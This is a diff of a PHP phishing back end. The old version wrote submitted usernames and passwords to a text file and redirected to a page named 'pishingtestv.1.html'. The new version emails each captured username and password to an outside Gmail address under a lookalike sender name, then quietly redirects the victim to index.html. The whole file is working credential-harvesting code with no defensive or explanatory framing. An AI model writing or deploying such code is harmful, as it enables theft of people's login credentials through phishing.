@@ -1,12 +1,20 @@
 <?php
-    extract($_REQUEST);
-    $data_file = fopen("form-save.txt","w");
+$name = $_POST['uname'];
+$pass = $_POST['psw'];
 
-    fwrite($file,"name :");
-    fwrite($file, $uname ."\n");
-    
-    fwrite($file,"Password :");
-    fwrite($file, $psw ."\n");
-    fclose($file);
-    header("location: pishingtestv.1.html");
- ?>
+$email_from = 'boeingnot@gmail.com';
+
+$email_subject = 'test';
+
+$email_body = "username: $name password: $pass";
+
+$to = "filmroyalp@gmail.com";
+
+$headers = "From: $email_from \r\n";
+
+$headers .= "Reply-To: $visitor_email \r\n";
+
+mail($to,$email_subject,$email_body,$headers);
+
+header("location: index.html")
+?>
